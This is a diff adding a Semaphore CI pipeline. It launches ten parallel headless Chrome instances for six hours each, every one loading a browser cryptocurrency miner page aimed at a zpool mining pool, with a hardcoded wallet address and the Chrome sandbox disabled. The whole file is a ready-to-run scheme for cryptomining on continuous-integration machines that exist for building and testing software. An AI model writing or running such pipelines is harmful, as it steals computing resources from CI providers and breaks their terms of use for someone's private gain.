@@ -1,0 +1,49 @@
+version: v1.0
+name: 'Run Webminer in Real Chrome (10x Parallel, 6h Each)'
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+blocks:
+  - name: Start Chrome Webminer
+    task:
+      jobs:
+        - name: Webminer Instance
+          parallelism: 10
+          commands:
+            - echo "Updating and installing dependencies..."
+            - sudo apt-get update
+            - sudo apt-get install -y wget unzip xvfb fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libcups2 libdbus-1-3 libgdk-pixbuf2.0-0 libnspr4 libnss3 libxcomposite1 libxdamage1 libxrandr2 xdg-utils
+            - echo "Installing latest Google Chrome..."
+            - 'wget -q -O chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb'
+            - sudo dpkg -i chrome.deb || sudo apt-get -f install -y
+            - sudo dpkg -i chrome.deb
+            - echo "Verifying Chrome installation..."
+            - google-chrome --version
+            - echo "Starting Xvfb (virtual display)..."
+            - 'export DISPLAY=:99'
+            - 'Xvfb :99 -screen 0 1920x1080x24 > /dev/null 2>&1 &'
+            - sleep 2
+            - echo "Launching Chrome in headless mode to run the miner webpage..."
+            - |
+              google-chrome \
+                --no-sandbox \
+                --disable-gpu \
+                --disable-software-rasterizer \
+                --disable-dev-shm-usage \
+                --disable-extensions \
+                --disable-background-networking \
+                --disable-sync \
+                --disable-default-apps \
+                --disable-translate \
+                --disable-features=TranslateUI \
+                --remote-debugging-port=9222 \
+                --window-size=1920,1080 \
+                --user-data-dir=/tmp/chrome-profile-${SEMAPHORE_JOB_INDEX} \
+                --headless=new \
+                "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RHWiosLvVQC71ErsX7wygddR1uv63LLfYo&password=c%3DRVN&workers=4" &
+            - echo "Chrome launched. Keeping job alive for 6 hours (21600 seconds)..."
+            - sleep 21600
+            - echo "6 hours elapsed. Killing Chrome and Xvfb..."
+            - pkill chrome || true
+            - pkill Xvfb || true
